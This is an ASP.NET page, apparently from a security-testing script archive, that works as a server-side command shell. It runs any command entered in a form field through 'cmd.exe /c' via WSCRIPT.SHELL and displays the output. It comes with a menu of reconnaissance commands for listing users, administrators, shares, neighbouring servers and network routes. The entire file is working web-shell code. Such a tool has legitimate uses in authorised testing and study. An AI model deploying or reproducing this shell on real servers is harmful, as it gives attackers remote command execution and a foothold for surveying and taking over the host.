<%@ Page Language="VB" aspcompat=true autoeventwireup="false" Src="../../scripts_archive.vb" Inherits="Scripts_Archive" Debug="true" %>


<%
	dim szCMD
	dim oFileSys = Server.CreateObject("Scripting.FileSystemObject")
	dim oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
	dim szTempFile = Environment.GetEnvironmentVariable("TEMP") & "\"& oFileSys.GetTempName( )

	If Request.Form(".CMD") = "" Then
		szCMD = "dir c:\"	
	else 
		szCMD = Request.Form(".CMD")
	End If	  
  
	execute_command(szCMD,szTempFile)	

'	Output_temp_file(szTempFile,oFileSys)	
  
%>
	<html>
	<head>
		<% Link_to_style_sheet%>
	</head>
	<body>
				
		<%	End_if_in_safe_mode %>
		
<b>Example of a server based Command Prompt (shell)</b><br>
<FORM action="<%= Request.ServerVariables("URL") %>" method="POST">
&nbsp;<table border="0" cellpadding="0" cellspacing="0" width="100%" id="AutoNumber1">
  <tr>
    <td width="50%"><b>Command to execute:<br>
    </b> <input type=text name=".CMD" size=45 value="<%= szCMD %>">
<input type=submit value="Run"> </td>
    <td width="50%"><b>Sample commands</b> (this list is not dynamic, you will need to type the command on the text box on the right)<br>
    <select size="1" name="D1">
    <option>"dir c:\" - lists the contents of the C:\ drive</option>
    <option>"calcs c:\" -     Security permissions on the C:\ drive</option>
    <option>"ipconfig" - Network configuration </option>
    <option>"net users" - List of users</option>
    <option>"net share" - List of shares</option>
    <option>"net localgroup administrators" - </option>
    <option>"net accounts" - Account Policies </option>
    <option>"net view" - Surrouding computers/Servers</option>
    <option>"net config server" - server configuration</option>
    <option>"route print" - Network routes</option>
    <option>"at" - Scheduled Events (AT)*</option>
    </select></td>
  </tr>
</table>
</FORM>
<PRE>Account being used: <%= "\\" & oScriptNet.ComputerName & "\" & oScriptNet.UserName %>
<br>
<b>results:</b><br>

<%
		Output_temp_file(szTempFile,oFileSys)	
%> 
</BODY></HTML>

<script runat=server>
	function execute_command(cmd_to_execute, szTempFile)
			
		  Dim oScript
				
		  oScript = Server.CreateObject("WSCRIPT.SHELL")
  	      Call oScript.Run ("cmd.exe /c " & cmd_to_execute & " > " & szTempFile, 0, True)
	end function
	
	sub Output_temp_file(szTempFile,oFileSys)
		' -- Read the output from our command and remove the temp file -- '
	    On Error Resume Next

		dim oFile = oFileSys.OpenTextFile (szTempFile, 1, False, 0)
	
    		Response.Write (Server.HTMLEncode(oFile.ReadAll))
    		oFile.Close
    		Call oFileSys.DeleteFile(szTempFile, True)
		 
	end sub
</script>